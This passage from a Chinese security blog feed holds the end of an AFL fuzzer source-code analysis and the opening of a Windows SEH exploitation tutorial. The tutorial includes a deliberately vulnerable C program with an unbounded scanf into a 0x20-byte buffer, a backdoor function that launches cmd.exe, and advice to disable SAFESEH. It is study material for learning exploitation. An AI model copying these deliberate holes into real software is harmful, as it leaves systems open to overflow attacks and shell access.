1</code></li></ul></li><li>打开<code>qd_path/qd_ent-&gt;d_name</code>这个路径<ul><li>如果文件大小不为0，且小于<code>MAX_FILE</code>，就不进行sync</li><li>否则mmap这个文件到内存mem里，通过<code>write_to_testcase</code>将mem写到<code>.cur_input</code>中</li><li><code>run_target</code>，运行对应文件，返回值赋值给fault</li><li>然后通过<code>save_if_interesting</code>来决定是否要导入这个文件到自己的queue里，如果发现了新的path，就导入<ul><li>syncing_party的值为<code>sd_ent-&gt;d_name</code></li><li>如果返回值为1，则<code>queued_imported</code>计数器+1</li></ul></li><li>stage_cur计数器加一，如果stage_cur是<code>stats_update_freq</code>的倍数，就刷新一次展示界面</li></ul></li><li>向当前id_fd中写入当前的<code>next_min_accept</code>值</li></ul></li><li>先读取有哪些fuzzer文件夹，然后读取其他fuzzer文件夹下的queue文件夹里的case，并依次执行，如果发现了新path，就保存到自己的queue文件夹里，而且将最后一个sync的case id写入到<code>.synced/其他fuzzer文件夹名</code>文件里，以避免重复运行</li></ul><h4 id="save-if-interesting"><a href="#save-if-interesting" class="headerlink" title="save_if_interesting"></a>save_if_interesting</h4><blockquote><p>这个case的执行结果是否是interesting的，决定是否保存或跳过</p></blockquote><p>设置keeping为0</p><p>如果fault为crash_mode</p><p><code>hnb = has_new_bits(virgin_bits)</code>，如果没有新的path发现或者path命中次数相同，就直接返回0</p><p>否则，将case保存到<code>fn = alloc_printf("%s/queue/id:%06u,%s", out_dir, queued_paths, describe_op(hnb))</code>文件里</p><p>利用add_to_queue将其添加到队列里</p><p>如果hnb的值是2，代表发现了新path，设置刚刚加入到队列里的queue的<code>has_new_cov</code>字段为1，即<code>queue_top-&gt;has_new_cov = 1</code>，然后<code>queued_with_cov</code>计数器加一</p><p>保存hash到其exec_cksum</p><p>评估这个queue</p><p>设置keeping值为1</p><p>根据fault结果进入不同的分支</p><ul><li>FAULT_TMOUT<ul><li>设置total_tmouts计数器加一</li><li>如果<code>unique_hangs</code>的个数超过能保存的最大数量<code>KEEP_UNIQUE_HANG</code>，就直接返回keeping的值</li><li>如果不是dumb mode，就<code>simplify_trace((u64 *) trace_bits)</code>进行规整</li><li>如果没有发现新的超时路径则返回keeping</li><li>否则，代表发现了新的超时路径，unique_tmouts计数器加一</li><li>如果<code>hang_tmout</code>大于<code>exec_tmout</code>，mem写入out_file，以<code>hang_tmout</code>为<code>timeout</code>，重新执行一次<code>runt_target</code><ul><li>如果结果不是<code>FAULT_TMOUT</code>，就返回keeping，否则就使<code>unique_hangs</code>计数器加一，然后更新last_hang_time的值，并保存到<code>alloc_printf("%s/hangs/id:%06llu,%s", out_dir, unique_hangs, describe_op(0))</code>文件</li></ul></li></ul></li><li>FAULT_CRASH<ul><li>Total_crashes计数器加一</li><li>如果unique_crashes大于能保存的最大数量<code>KEEP_UNIQUE_CRASH</code>即5000，就直接返回keeping的值</li><li>如果不是dumb_mode模式<ul><li>就<code>simplify_trace((u64 *) trace_bits)</code>进行规整</li></ul></li><li>如果没有发现新的路径，则返回keeping</li><li>如果发现了路径，则调用<code>write_crash_readme()</code>写<code>out_dir/crashes/README.txt</code></li><li>然后unique_crashes计数器加一，并将结果保存到<code>alloc_printf("%s/crashes/id:%06llu,sig:%02u,%s", out_dir,unique_crashes, kill_signal, describe_op(0))</code>文件</li><li>更新last_crash_time和last_crash_execs</li></ul></li></ul><h4 id="simplify-trace"><a href="#simplify-trace" class="headerlink" title="simplify_trace"></a>simplify_trace</h4><p>8字节一组读入，直到读取完mem</p><p>如果mem不为空</p><ul><li>i从0-7，<code>mem8[i] = simplify_lookup[mem8[i]]</code>，代表规整该路径的命中次数到指令值，这个路径如果没有命中，就设置为1，如果命中了，就设置为128，即二进制的<code>1000 0000</code></li><li>否则设置mem为<code>0x0101010101010101ULL</code>，即代表这8个字节代表的path都没有命中，每个字节的值被置为1</li></ul><h4 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz_one"></a>fuzz_one</h4><blockquote><p>从queue中取出entry进行fuzz，成功返回0，跳过或退出的话返回1</p></blockquote><p>如果<code>pending_favored</code>不为0，则对于queue_cur被fuzz过或者不是favored的，有99%的几率直接返回1</p><p>如果<code>pending_favored</code>为0，且不是dumb_mode模式，且本次case不是favored，且queue中的case数量大于10</p><ul><li><p>如果<code>queue_cycle</code>大于1并且没有被fuzz过的，75%的概率返回1</p></li><li><p>如果queue_cur被fuzz过，否则有95%的概率直接返回1</p></li></ul><p>打开testcase文件并设置len为<code>queue_cur-&gt;len</code></p><p>打开该case对应的文件，并通过mmap映射到内存里，地址赋值给<code>in_buf</code>和<code>orig_in</code></p><blockquote><p><strong>CALIBRATION阶段</strong></p></blockquote><p>假如当前项有校准错误，并且校准错误次数小于3次，那么就用calibrate_case再次校准。</p><blockquote><p><strong>TRIMMING阶段</strong></p></blockquote><p>测试用例有没有修剪过</p><p>如果不是dumb_mode模式，并且case没有经过修剪</p><p>调用函数<code>trim_case</code>进行修剪</p><p>设置queue_cur的trim_done为1，代表已经修剪</p><p>重新读取一次<code>queue_cur-&gt;len</code>到len中</p><p>将in_buf拷贝len个字节到out_buf中</p><blockquote><p><strong>PERFORMANCE SCORE阶段</strong></p></blockquote><p>是否已经经历过<code>deterministic</code>阶段，如果已经经历过，直接跳转至havoc阶段</p><p>调用<code>calculate_score</code>函数计算当前case的可取性得分</p><p>如果<code>skip_deterministic</code>为1，或者queue_cur被fuzz过，或者queue_cur的passed_det为1，则跳转去<code>havoc_stage</code>阶段</p><p>如果执行路径校验和将其置于此主实例的范围之外，则跳转至<code>havoc_stage</code></p><p>设置<code>doing_det</code>为1</p><blockquote><p><strong>SIMPLE BITFLIP (+dictionary construction)阶段</strong></p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FLIP_BIT(_ar, _b) do { \</span></span><br><span class="line"><span class="meta">    u8* _arf = (u8*)(_ar); \</span></span><br><span class="line"><span class="meta">    u32 _bf = (_b); \</span></span><br><span class="line"><span class="meta">    _arf[(_bf) &gt;&gt; 3] ^= (128 &gt;&gt; ((_bf) &amp; 7)); \</span></span><br><span class="line"><span class="meta">  } while (0)</span></span><br></pre></td></tr></tbody></table></figure><p>它的作用是将一个数组 <code>_ar</code> 中指定位置 <code>_b</code> 的二进制位（bit）进行翻转（0 变成 1，1 变成 0）将case中内容按位取反的变异过程</p><p>首先将 <code>_ar</code> 强制转换为一个 <code>u8</code> 指针，即无符号 8 位整型指针，举个例子，如果queue里面现在是abcdefg，那么第一组取值就为abcd</p><p><code>_ar的取值是out_buf,而_bf的取值在[0: len &lt;&lt; 3)</code>，所以用<code>_bf &amp; 7</code>能够得到<code>0,1,2...7 0,1,2...7</code>这样的取值一共len组</p><p>然后是<code>(128 &gt;&gt; ((_bf) &amp; 7))</code>也就是<code>128 &gt;&gt; 0 = 10000000, 128 &gt;&gt; 1 = 01000000....128 &gt;&gt; 7 = 00000001</code></p><p><code>_bf &gt;&gt; 3</code>就是8个全0+8个全1+8个全2+8个全3</p><p>最后是<code>_arf[(_bf) &gt;&gt; 3] ^= (128 &gt;&gt; ((_bf) &amp; 7))</code>= <code>_arf[(_bf) &gt;&gt; 3] = _arf[(_bf) &gt;&gt; 3] ^ (128 &gt;&gt; ((_bf) &amp; 7))</code></p><p>_arf[0]为a，a的二进制为<code>97 = 01100001</code>，<code>_arf[0] = 01100001 ^ 10000000， _arf[0] = 01100001 ^ 01000000 .....</code></p><p>然后执行一次<code>common_fuzz_stuff</code>，然后再翻转回来</p><p>在进行bitflip 1/1变异时，对于每个byte的最低位(least significant bit)翻转还进行了额外的处理：如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致，那么就把这一段连续的bytes判断是一条token<br>比如对于SQL的<code>SELECT *</code>，如果<code>SELECT</code>被破坏，则肯定和正确的路径不一致，而被破坏之后的路径却肯定是一样的，比如<code>AELECT</code>和<code>SBLECT</code>，显然都是无意义的，而只有不破坏token，才有可能出现和原始执行路径一样的结果，所以AFL在这里就是在猜解关键字token</p><p>如果不是dumb_mode模式，并且<code>stage_cur &amp; 7 == 0</code></p><ul><li><code>stage_cur == 7、15...</code>，当翻转到每个字节最低有效位的时候进入分支</li><li>hash32运算，值记录在cksum中</li><li>如果循环到<code>stage_max - 1</code>，并且结果和上一次结果相同<ul><li>如果当前token数量小于32<ul><li>将当前字符作为token拼接到<code>a_collect[]</code>数组中</li></ul></li><li>如果token数量大于等于3，并且小于等于32<ul><li>调用<code>maybe_add_auto</code>将累计的<code>a_collect[]</code>数组中的内容添加到<code>a_extras[]</code>数组中</li></ul></li></ul></li><li>如果和上一次结果不相同<ul><li>如果token数量大于等于3，并且小于等于32<ul><li>调用<code>maybe_add_auto</code>将累计的<code>a_collect[]</code>数组中的内容添加到<code>a_extras[]</code>数组中</li></ul></li></ul></li><li>如果当前和原始路径不一样，则可能是因为token被破坏<ul><li>如果token数量小于32<ul><li>添加到a_collect数组中</li></ul></li></ul></li></ul><p><code>stage_finds[STAGE_FLIP1]</code>的值加上在整个FLIP_BIT中新发现的路径和Crash总和</p><p><code>stage_cycles[STAGE_FLIP1]</code>的值加上在整个FLIP_BIT中执行的target次数<code>stage_max</code></p><p>设置<code>stage_name</code>为<code>bitflip 2/1</code>，这次是连续翻转相邻的两位，保存结果到<code>stage_finds[STAGE_FLIP2]和stage_cycles[STAGE_FLIP2]</code></p><p>设置stage_name为<code>bitflip 4/1</code>，翻转连续的四位并记录</p><p>在进行bitflip 8/8变异时，AFL还生成了一个非常重要的信息：<code>effector map</code>。这个<code>effector map</code>几乎贯穿了整个<code>deterministic fuzzing</code>的始终</p><p>具体地，在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在<code>effector map</code>中标记为1，即“有效”的，否则标记为0，即”无效的。</p><p>这样做的逻辑是：如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考<code>effectormap</code>，跳过那些”无效”的byte，从而节省了执行资源</p><p>由此，通过极小的开销（没有增加额外的执行次数），AFL又一次对文件格式进行了启发式的判断</p><p>不过，在某些情况下并不会检测有效字符。第一种情况就是dumb mode或者从fuzzer，此时文件所有的字符都有可能被变异</p><p>设置stage_name为<code>bitflip 8/8</code>，以字节为单位，直接通过和<code>0xff</code>亦或运算去翻转整个字节的位，然后执行一次，并记录</p><ul><li>调用<code>common_fuzz_stuff</code>对变异后数据进行测试，记录interesting</li><li>如果<code>eff_map[stage_cur&gt;&gt;3]</code>为0<ul><li>如果不是dumb_mode模式并且len大于等于128<ul><li>计算cksum</li></ul></li><li>否则如果是dumb_mode模式或len小于128<ul><li>cksum等于<code>~queue_cur-&gt;exec_cksum</code></li></ul></li><li>如果<code>cksum != queue_cur-&gt;exec_cksum</code><ul><li>则代表产生了新的路径，此时对应的eff_map中的项标记为1</li></ul></li><li>接着复位+记录</li></ul></li></ul><p>设置stage_name为<code>bitflip 16/8</code>，设置<code>stage_max</code>为<code>len - 1</code>，以字为单位和<code>0xffff</code>进行亦或运算，连续两byte翻转</p><ul><li>这里要注意在翻转之前会先检查eff_map里对应于这两个字节的标志是否为0，如果为0，则这两个字节是无效的数据，stage_max减一，然后开始变异下一个字</li><li>变异完成之后，还原</li></ul><p>设置stage_name为<code>bitflip 32/8</code>，然后设置<code>stage_max</code>为<code>len - 3</code>，以双字为单位，直接通过和<code>0xffffffff</code>亦或运算去相邻四个字节的位，连续四个byte翻转，然后执行一次，并记录</p><ul><li>在每次翻转之前会检查eff_map里对应于这四个字节的标志是否为0，如果是0，则这两个字节是无效的数据，stage_max减一，然后开始变异下一组双字</li></ul><blockquote><p>ARITHMETIC INC/DEC阶段</p></blockquote><p>加减变异，会对目标整数进行<code>+1、+2…+35，-1、-2…-35</code>，由于整数存在大端序和小端序两种表现形式，所以这个阶段会对两种端序进行变异</p><p>这个和上面的bitflip有相似的过程，目标大小的不同，也分为了多个子阶段</p><p>这个阶段有两个非常智能的做法，第一个是前面提到的<code>effector map</code>：如果一个整数的所有bytes都被判断为”无效”，那么就跳过对整数的变异。第二种情况是之前bitflip已经生成过的变异：如果加/减某个数后，其效果与之前的某种bitflip相同，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行</p><p>设置<code>stage_name</code>为<code>arith 8/8</code>，每次对8个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个byte进行整数加减变异</p><p>设置<code>stage_name</code>为<code>arith 16/8</code>，每次对16个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个word进行整数加减变异</p><p>设置<code>stage_name</code>为<code>arith 32/8</code>，每次对32个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个dword进行整数加减变异</p><blockquote><p>INTERESTING VALUES 阶段</p></blockquote><p>将out_buf中的字节替换成AFL内部预设的数值</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> s8 interesting_8[] = {INTERESTING_8};</span><br><span class="line"><span class="type">static</span> s16 interesting_16[] = {INTERESTING_8, INTERESTING_16};</span><br><span class="line"><span class="type">static</span> s32 interesting_32[] = {INTERESTING_8, INTERESTING_16, INTERESTING_32};</span><br></pre></td></tr></tbody></table></figure><ul><li>interest 8/8，每次对8个bit进替换，按照每8个bit的步长从头开始，即对文件的每个byte进行替换</li><li>interest 16/8，每次对16个bit进替换，按照每8个bit的步长从头开始，即对文件的每个word进行替换</li><li>interest 32/8，每次对32个bit进替换，按照每8个bit的步长从头开始，即对文件的每个dword进行替换</li></ul><p>这个变异同样很智能，<code>effector map</code>仍然会用于判断是否需要变异；此外，如果某个<code>interesting value</code>，是可以通过<code>bitflip</code>或者<code>arithmetic</code>变异达到，那么这样的重复性变异也是会跳过的</p><blockquote><p>DICTIONARY STUFF阶段</p></blockquote><p>用户提供的tokens，是在词典文件中设置并通过-x选项指定的，如果没有则跳过相应的子阶段</p><ul><li>user extras(over),从头开始,将用户提供的tokens依次替换到原文件中,stage_max为<code>extras_cnt * len</code></li><li>user extras(insert),从头开始,将用户提供的tokens依次插入到原文件中,stage_max为<code>extras_cnt * len</code></li><li>auto extras(over),从头开始,将自动检测的tokens依次替换到原文件中,stage_max为<code>MIN(a_extras_cnt, USE_AUTO_EXTRAS) * len</code></li></ul><blockquote><p>RANDOM HAVOC阶段</p></blockquote><p>这个阶段就是dumb_mode和从fuzzer一开始就经历的阶段，充满各种随机性，对原文件进行大量变异</p><ul><li>随机选取某个bit进行翻转</li><li>随机选取某个byte，将其设置为随机的interesting value</li><li>随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个byte，对其减去一个随机数</li><li>随机选取某个byte，对其加上一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个byte，将其设置为随机数</li><li>随机删除一段bytes</li><li>随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数</li><li>随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</li><li>怎么样，看完上面这么多的“随机”，有没有觉得晕？还没完，AFL会生成一个随机数，作为变异组合的数量，并根据这个数量，每次从上面那些方式中随机选取一个（可以参考高中数学的有放回摸球），依次作用到文件上。如此这般丧心病狂的变异，原文件就大概率面目全非了，而这么多的随机性，也就成了fuzzing过程中的不可控因素，即所谓的“看天吃饭”了。</li><li>splice</li><li>设置ret_val的值为0</li><li>如果queue_cur通过了评估，且was_fuzzed字段是0，就设置<code>queue_cur-&gt;was_fuzzed</code>为1，然后pending_not_fuzzed计数器减一</li><li>如果queue_cur是favored, pending_favored计数器减一</li></ul><blockquote><p>SPLICING 阶段</p></blockquote><p>RANDOM HAVOC阶段后没有什么效果，那么就会进入到SPLICING阶段，尝试拼接两个测试用例中的内容，拼接之后重新走一遍RANDOM HAVOC阶段</p><p>至此，第一轮变异完成，开始第二轮</p><h4 id="trim-case"><a href="#trim-case" class="headerlink" title="trim_case"></a>trim_case</h4><p>直接这个case的大小len小于5字节，就直接返回</p><p>设置<code>stage_name</code>的值为tmp，在<code>bytes_trim_in</code>的值里加上len，<code>bytes_trim_in</code>代表被trim过的字节数</p><p>len_p2，其值是大于等于q-&gt;len的第一个2的幂次</p><p>取<code>len_p2的1/16</code>为remove_len，这是起始步长</p><p>进入while循环，终止条件是remove_len小于终止步长<code>len_p2的1/1024</code>,<strong>每轮循环步长会除2</strong></p><ul><li><p>设置remove_pos的值为remove_len</p></li><li><p><code>stage_name = trim 512/512</code></p></li><li><p>设置stage_cur为0，stage_max为<code>q-&gt;len / remove_len</code></p></li><li><p><code>remove_pos &lt; q-&gt;len</code>,即每次前进remove_len个步长，直到整个文件都被遍历完为止</p><ul><li><p>由in_buf中<code>remove_pos</code>处开始，向后跳过<code>remove_len</code>个字节，写入到<code>.cur_input</code>里，然后运行一次<code>fault = run_target</code>，trim_execs计数器加一</p></li><li><p>如果主动中断，或返回值报错，直接跳转至<code>abort_trimming</code></p></li><li><p>由所得trace_bits计算出一个cksum，和<code>q-&gt;exec_cksum</code>比较</p><ul><li>如果相等<ul><li>从<code>q-&gt;len</code>中减去remove_len个字节，并由此重新计算出一个<code>len_p2</code>，这里注意一下<code>while (remove_len &gt;= MAX(len_p2 / TRIM_END_STEPS, TRIM_MIN_BYTES))</code></li><li>将<code>in_buf+remove_pos+remove_len</code>到最后的字节，前移到<code>in_buf+remove_pos</code>处，等于删除了remove_pos向后的remove_len个字节</li><li>如果needs_write为0，则设置其为1，并保存当前trace_bits到clean_trace中</li></ul></li><li>如果不相等<ul><li>remove_pos加上remove_len，即前移remove_len个字节。<strong>注意，如果相等，就无需前移</strong></li></ul></li></ul></li><li><p>注意trim过程可能比较慢，所以每执行<code>stats_update_freq</code>次，就刷新一次显示界面<code>show_stats</code></p></li><li><p>stage_cur加一</p></li></ul></li></ul><p>如果needs_write为1</p><ul><li>删除原来的q-&gt;fname，创建一个新的q-&gt;fname，将in_buf里的内容写入，然后用clean_trace恢复trace_bits的值。</li><li>进行一次<code>update_bitmap_score</code></li></ul><p>返回fault</p><h4 id="calculate-score"><a href="#calculate-score" class="headerlink" title="calculate_score"></a>calculate_score</h4><blockquote><p>根据queue entry的执行速度、覆盖到的path数和路径深度来评估出一个得分，这个得分perf_score在后面havoc的时候使用</p></blockquote><p>计算平均时间、bitmap大小、设置初始perf_score为100</p><ul><li>处理输入时<ul><li>在<code>read_testcases</code>的时候会调用<code>add_to_queue</code>，此时所有的<code>input case</code>的<code>queue depth</code>都会被设置为1`</li></ul></li><li>fuzz_one时<ul><li>然后在后面fuzz_one的时候，会先设置cur_depth为当前queue的depth，然后这个queue经过mutate之后调用<code>save_if_interesting</code>,如果是<code>interesting case</code>，就会被<code>add_to_queue</code>，此时就建立起了queue之间的关联关系，所以由当前queue变异加入的新queue，深度都在当前queue的基础上再增加</li></ul></li></ul><h4 id="common-fuzz-stuff"><a href="#common-fuzz-stuff" class="headerlink" title="common_fuzz_stuff"></a>common_fuzz_stuff</h4><blockquote><p>简单的说就是写入文件并执行，然后处理结果，如果出现错误，就返回1</p></blockquote><p>如果定义了<code>post_handler</code>,就通过<code>out_buf = post_handler(out_buf, &amp;len)</code>处理一下out_buf，如果out_buf或者len有一个为0，则直接返回0，<strong>对变异完的queue，最一层包装在写入的时候非常有用</strong></p><p><code>write_to_testcase</code>写入.cur_input</p><p><code>fault = run_target(argv, exec_tmout)</code></p><p>如果fault是<code>FAULT_TMOUT</code></p><ul><li>如果<code>subseq_tmouts++ &gt; TMOUT_LIMIT</code>（默认250），就将<code>cur_skipped_paths</code>加一，直接返回1</li><li><code>subseq_tmout</code>是连续超时数</li></ul><p>否则设置<code>subseq_tmout</code>为0</p><p>如果<code>skip_requested</code>为1</p><ul><li>设置<code>skip_requested</code>为0，然后将<code>cur_skipped_paths</code>加一，直接返回1</li></ul><p>如果发现了新的路径，<code>queued_discovered+1</code></p><p>如果<code>stage_cur</code>除以<code>stats_update_freq</code>余数是0，或者其加一等于<code>stage_max</code>，就更新展示界面show_stats</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>AFL_fuzz核心代码都调试结束了，还有afl-clang-fast，后续如果有时间会继续</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p><p><a href="https://paper.seebug.org/1732/#331-fuzz_one">https://paper.seebug.org/1732/#331-fuzz_one</a></p></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;AFL-fuzz源码分析&quot;&gt;&lt;a href=&quot;#AFL-fuzz源码分析&quot; class=&quot;headerlink&quot; title=&quot;AFL_fuzz源码分析&quot;&gt;&lt;/a&gt;AFL_fuzz源码分析&lt;/h1&gt;&lt;blockqu</summary>
      
    
    
    
    <category term="study" scheme="https://www.z1r0.top/categories/study/"/>
    
    
    <category term="fuzz" scheme="https://www.z1r0.top/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>win pwn初探（四）</title>
    <link href="https://www.z1r0.top/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>https://www.z1r0.top/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/</id>
    <published>2023-02-22T08:24:28.000Z</published>
    <updated>2023-08-17T06:34:23.873Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><blockquote><p>这篇开始学习SEH</p></blockquote><p>之前的文章链接：</p><ul><li><a href="https://xz.aliyun.com/t/11913">win pwn初探（三）</a></li><li><a href="https://xz.aliyun.com/t/11891">win pwn初探（二）</a></li><li><a href="https://xz.aliyun.com/t/11865">win pwn初探（一）</a></li></ul><h1 id="win-pwn初探（四）"><a href="#win-pwn初探（四）" class="headerlink" title="win pwn初探（四）"></a>win pwn初探（四）</h1><h2 id="什么是SEH"><a href="#什么是SEH" class="headerlink" title="什么是SEH"></a>什么是SEH</h2><p>结构化异常处理（Structured Exception Handling，简称 SEH）是一种Windows 操作系统对错误或异常提供的处理技术，用于处理异常事件的程序控制结构</p><p>通俗易懂的来说就是<code>__try,__except,__finally</code>这些东西</p><h2 id="SEH里面长什么样子"><a href="#SEH里面长什么样子" class="headerlink" title="SEH里面长什么样子"></a>SEH里面长什么样子</h2><p>这个也困惑了我很长时间，网上的文献大部分都是直接讲的里面的结构体，不知道在程序里如果表现，如何通过调试去看这个SEH</p><p>用下面的程序来调试，记得关掉SAFESEH</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> {</span><br><span class="line">system(<span class="string">"cmd.exe"</span>);</span><br><span class="line">}  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">{</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line"><span class="type">int</span> x = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> z;</span><br><span class="line"><span class="type">char</span> tmp[<span class="number">0x20</span>];</span><br><span class="line">_try {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%p\n"</span>, backdoor);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>, tmp);</span><br><span class="line">z = x / y;</span><br><span class="line">}</span><br><span class="line">_except (<span class="number">1</span>) {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"seh"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><code>z = x / y;</code>这里是除数是0引起的异常，所以正常运行之后还会输出seh</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">004119B</span>0</span><br><span class="line">.text:<span class="number">004119B</span>0                               ; __unwind { <span class="comment">// __except_handler4</span></span><br><span class="line">.text:<span class="number">004119B</span>0 <span class="number">55</span>                            push    ebp</span><br><span class="line">.text:<span class="number">004119B</span>1 <span class="number">8B</span> EC                         mov     ebp, esp</span><br><span class="line">.text:<span class="number">004119B</span>3 <span class="number">6</span>A FE                         push    <span class="number">0F</span>FFFFFFEh</span><br><span class="line">.text:<span class="number">004119B</span>5 <span class="number">68</span> C8 <span class="number">91</span> <span class="number">41</span> <span class="number">00</span>                push    offset stru_4191C8</span><br><span class="line">.text:<span class="number">004119B</span>A <span class="number">68</span> <span class="number">80</span> <span class="number">1F</span> <span class="number">41</span> <span class="number">00</span>                push    offset __except_handler4</span><br><span class="line">.text:<span class="number">004119B</span>F <span class="number">64</span> A1 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>             mov     eax, large fs:<span class="number">0</span></span><br><span class="line">.text:<span class="number">004119</span>C5 <span class="number">50</span>                            push    eax</span><br><span class="line">.text:<span class="number">004119</span>C6 <span class="number">81</span> C4 E8 FE FF FF             add     esp, <span class="number">0F</span>FFFFEE8h</span><br><span class="line">.text:<span class="number">004119</span>CC <span class="number">53</span>                            push    ebx</span><br><span class="line">.text:<span class="number">004119</span>CD <span class="number">56</span>                            push    esi</span><br><span class="line">.text:<span class="number">004119</span>CE <span class="number">57</span>                            push    edi</span><br></pre></td></tr></tbody></table></figure><p>通过ida打开发现<code>push    offset __except_handler4</code>，这个是将处理结构异常函数的地址入栈</p><p>用windbg打开此程序进行调试，在程序头下个断点</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    test!main:</span><br><span class="line"><span class="number">001419b</span>0 <span class="number">55</span>               push    ebp</span><br><span class="line"><span class="number">001419b</span>1 <span class="number">8b</span>ec             mov     ebp, esp</span><br><span class="line"><span class="number">001419b</span>3 <span class="number">6</span>afe             push    <span class="number">0F</span>FFFFFFEh</span><br><span class="line"><span class="number">001419b</span>5 <span class="number">68</span>c8911400       push    <span class="number">1491</span>C8h</span><br><span class="line"><span class="number">001419b</span>a <span class="number">68801f</span>1400       push    <span class="number">141F</span>80h</span><br><span class="line"><span class="number">001419b</span>f <span class="number">64</span>a100000000     mov     eax, dword ptr fs:[<span class="number">00000000</span>h]</span><br></pre></td></tr></tbody></table></figure><p>然后dt去查看0x141F80这个定义</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt <span class="number">0x141F80</span></span><br><span class="line">_except_handler4</span><br><span class="line"> _EXCEPTION_DISPOSITION  test!_except_handler4+<span class="number">0</span>(</span><br><span class="line">_EXCEPTION_RECORD*, </span><br><span class="line">_EXCEPTION_REGISTRATION_RECORD*, </span><br><span class="line">_CONTEXT*, </span><br><span class="line"><span class="type">void</span>*)</span><br></pre></td></tr></tbody></table></figure><p>可以看到会接收4个参数输入，并且该异常处理函数由系统调用，是一个回调函数，看第一个参数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span 